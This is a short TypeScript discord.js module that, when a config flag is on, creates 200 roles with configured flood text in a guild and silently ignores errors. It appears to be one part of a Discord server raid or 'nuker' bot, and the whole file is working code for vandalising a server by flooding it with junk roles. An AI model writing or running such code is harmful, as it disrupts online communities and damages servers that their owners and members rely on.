import { Guild } from "discord.js";
import Config from "../config/Config";

export default async (guild: Guild): Promise<void> => {
	if (Config.ChannelsFlood) {
		for (let i = 0; i < 200; i++) {
			await guild.roles
				.create({
					name: Config.RolesFloodText,
				})
				.catch(() => {});
		}
	}
};
